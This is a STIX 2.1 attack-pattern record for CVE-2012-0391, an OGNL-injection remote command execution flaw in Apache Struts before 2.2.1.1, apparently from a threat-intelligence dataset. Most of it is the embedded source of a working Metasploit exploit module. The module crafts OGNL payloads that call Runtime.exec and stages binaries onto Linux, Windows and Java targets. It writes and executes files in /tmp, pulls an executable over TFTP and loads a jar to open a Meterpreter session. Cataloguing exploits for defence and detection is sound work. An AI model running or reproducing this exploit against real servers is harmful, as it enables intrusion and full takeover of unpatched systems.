{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--71314c84-0102-47da-92d4-cd940f2e7db5",
    "created": "2024-08-14T17:10:42.662968Z",
    "modified": "2024-08-14T17:10:42.662973Z",
    "name": "Apache Struts Remote Command Execution",
    "description": " This module exploits a remote command execution vulnerability in Apache Struts versions < 2.2.1.1. This issue is caused because the ExceptionDelegator interprets parameter values as OGNL expressions during certain exception handling for mismatched data types of properties which allows remote attackers to execute arbitrary Java code via a crafted parameter. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/struts_code_exec_exception_delegator.rb",
            "external_id": "struts_code_exec_exception_delegator.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0391"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Struts Remote Command Execution',\n        'Description' => %q{\n          This module exploits a remote command execution vulnerability in\n          Apache Struts versions < 2.2.1.1. This issue is caused because the\n          ExceptionDelegator interprets parameter values as OGNL expressions\n          during certain exception handling for mismatched data types of properties,\n          which allows remote attackers to execute arbitrary Java code via a\n          crafted parameter.\n        },\n        'Author' => [\n          'Johannes Dahse', # Vulnerability discovery and PoC\n          'Andreas Nusser', # Vulnerability discovery and PoC\n          'juan vazquez', # Metasploit module\n          'sinn3r', # Metasploit module\n          'mihi' # ARCH_JAVA support\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2012-0391'],\n          [ 'OSVDB', '78277'],\n          [ 'EDB', '18329']\n        ],\n        'Platform' => %w{java linux win},\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win',\n              'CmdStagerFlavor' => 'tftp'\n            }\n          ],\n          [\n            'Linux Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ],\n          [\n            'Java Universal',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            },\n          ]\n        ],\n        'DisclosureDate' => '2012-01-06',\n        'DefaultTarget' => 2,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_config_sysinfo\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [ true, 'The path to a struts application action and the parameter to inject ie. /HelloWorldStruts2/hello?name=test&id=INJECT', \"\"]),\n        OptString.new('CMD', [ false, 'Execute this command instead of using command stager', \"\" ])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def execute_command(cmd, opts = {})\n    uri = String.new(datastore['TARGETURI'])\n    uri.gsub!(/INJECT/, \"'%2b(%23_memberAccess[\\\"allowStaticMethodAccess\\\"]=true,@java.lang.Runtime@getRuntime().exec(\\\"CMD\\\"))%2b'\") if target['Platform'] == 'win'\n    uri.gsub!(/INJECT/, \"'%2b(%23_memberAccess[\\\"allowStaticMethodAccess\\\"]=true,@java.lang.Runtime@getRuntime().exec(\\\"CMD\\\".split(\\\"@\\\")))%2b'\") if target['Platform'] == 'linux'\n    uri.gsub!(/INJECT/, \"'%2b(%23_memberAccess[\\\"allowStaticMethodAccess\\\"]=true,CMD,'')%2b'\") if target['Platform'] == 'java'\n    uri.gsub!(/CMD/, Rex::Text::uri_encode(cmd))\n\n    vprint_status(\"Attempting to execute: #{cmd}\")\n\n    resp = send_request_raw({\n      'uri' => uri,\n      'version' => '1.1',\n      'method' => 'GET',\n    }, 5)\n  end\n\n  def windows_stager\n    exe_fname = rand_text_alphanumeric(4 + rand(4)) + \".exe\"\n\n    print_status(\"Sending request to #{datastore['RHOST']}:#{datastore['RPORT']}\")\n    tftphost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n    execute_cmdstager({ temp: '.', tftphost: tftphost })\n    @payload_exe = generate_payload_exe\n\n    print_status(\"Attempting to execute the payload...\")\n    execute_command(@payload_exe)\n  end\n\n  def linux_stager\n    cmds = \"/bin/sh@-c@echo LINE | tee FILE\"\n    exe = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)\n    base64 = Rex::Text.encode_base64(exe)\n    base64.gsub!(/\\=/, \"\\\\u003d\")\n    file = rand_text_alphanumeric(4 + rand(4))\n\n    execute_command(\"/bin/sh@-c@touch /tmp/#{file}.b64\")\n    cmds.gsub!(/FILE/, \"/tmp/\" + file + \".b64\")\n    base64.each_line do |line|\n      line.chomp!\n      cmd = cmds\n      cmd.gsub!(/LINE/, line)\n      execute_command(cmds)\n    end\n\n    execute_command(\"/bin/sh@-c@base64 -d /tmp/#{file}.b64|tee /tmp/#{file}\")\n    execute_command(\"/bin/sh@-c@chmod +x /tmp/#{file}\")\n    execute_command(\"/bin/sh@-c@rm /tmp/#{file}.b64\")\n\n    execute_command(\"/bin/sh@-c@/tmp/#{file}\")\n    @payload_exe = \"/tmp/\" + file\n  end\n\n  def java_upload_part(part, filename, append = 'false')\n    cmd = \"\"\n    cmd << \"#f=new java.io.FileOutputStream('#{filename}',#{append}),\"\n    cmd << \"#f.write(new sun.misc.BASE64Decoder().decodeBuffer('#{Rex::Text.encode_base64(part)}')),\"\n    cmd << \"#f.close()\"\n    execute_command(cmd)\n  end\n\n  def java_stager\n    @payload_exe = rand_text_alphanumeric(4 + rand(4)) + \".jar\"\n    append = 'false'\n    jar = payload.encoded_jar.pack\n\n    chunk_length = 384 # 512 bytes when base64 encoded\n\n    while (jar.length > chunk_length)\n      java_upload_part(jar[0, chunk_length], @payload_exe, append)\n      jar = jar[chunk_length, jar.length - chunk_length]\n      append = 'true'\n    end\n    java_upload_part(jar, @payload_exe, append)\n\n    cmd = \"\"\n    # disable Vararg handling (since it is buggy in OGNL used by Struts 2.1\n    cmd << \"#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),\"\n    cmd << \"#q.setAccessible(true),#q.set(null,true),\"\n    cmd << \"#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),\"\n    cmd << \"#q.setAccessible(true),#q.set(null,false),\"\n    # create classloader\n    cmd << \"#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('#{@payload_exe}').toURI().toURL()}),\"\n    # load class\n    cmd << \"#c=#cl.loadClass('metasploit.Payload'),\"\n    # invoke main method\n    cmd << \"#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke(\"\n    cmd << \"null,new java.lang.Object[]{new java.lang.String[0]})\"\n    execute_command(cmd)\n  end\n\n  def on_new_session(client)\n    if client.type != \"meterpreter\"\n      print_error(\"Please use a meterpreter payload in order to automatically cleanup.\")\n      print_error(\"The #{@payload_exe} file must be removed manually.\")\n      return\n    end\n\n    client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n\n    if client.sys.config.sysinfo[\"OS\"] =~ /Windows/\n      print_error(\"Windows does not allow running executables to be deleted\")\n      print_error(\"The #{@payload_exe} file must be removed manually after migrating\")\n      return\n    end\n\n    print_warning(\"Deleting the #{@payload_exe} file\")\n    client.fs.file.rm(@payload_exe)\n  end\n\n  def exploit\n    unless datastore['CMD'].blank?\n      print_status(\"Executing user supplied command\")\n      execute_command(datastore['CMD'])\n      return\n    end\n\n    case target['Platform']\n    when 'linux'\n      linux_stager\n    when 'win'\n      windows_stager\n    when 'java'\n      java_stager\n    else\n      fail_with(Failure::NoTarget, 'Unsupported target platform!')\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-06",
    "x_mitre_platforms": [
        "java"
    ]
}